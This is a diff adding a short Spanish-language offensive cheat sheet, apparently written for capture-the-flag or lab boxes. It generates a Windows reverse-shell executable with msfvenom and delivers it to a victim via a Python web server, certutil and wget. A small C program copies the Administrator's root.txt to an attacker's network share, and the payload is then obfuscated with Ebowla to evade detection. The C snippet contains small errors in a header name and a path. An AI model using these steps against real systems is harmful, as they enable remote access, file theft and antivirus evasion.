@@ -1,0 +1,42 @@
+# msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe > rev.exe
+
+## subir a windows
+a> python3 -m http.server 8000
+v> certutil -f -split -urlcache  http://ip:8000/file file
+v> wget http://ip:8000/file -UseBasicParsing -O file
+
+# compilar con mingw-x64
+# sudo apt -y install gcc-mingw-w64-x86-64
+
+# C script
+#include <stlib.h>
+int main() {
+	system("type C:\\User\\Administrator\\Desktop\\root.txt > \\\\ip\\compartida\\root.txt");
+	}
+
+x86_64-w64-mingw32-gcc rev.c -o rev.exe
+
+# ofuscar con ebowla
+git clone https://github.com/Genetic-Malware/Ebowla.git
+
+mv rev.exe  Ebowla/
+cd Ebowla
+
+## editar genetic.config
+output_type = GO
+payload_type = EXE
+edit [[ENV_VAR]] # con datos del equipo victima
+
+# compilar
+python ebowla.py rev.exe genetic.config 
+
+# compilar en go
+./build_x64_go.sh output/go_symmetric_rev.exe.go rev_ebowla.exe
+
+## recomendado usar virtualenv por las dependencias de python2
+# apt install -y python3-virtualenv
+virtualenv -p /usr/bin/python2.7 PROYECTO
+source PROYECTO/bin/activate
+deactivate
+	
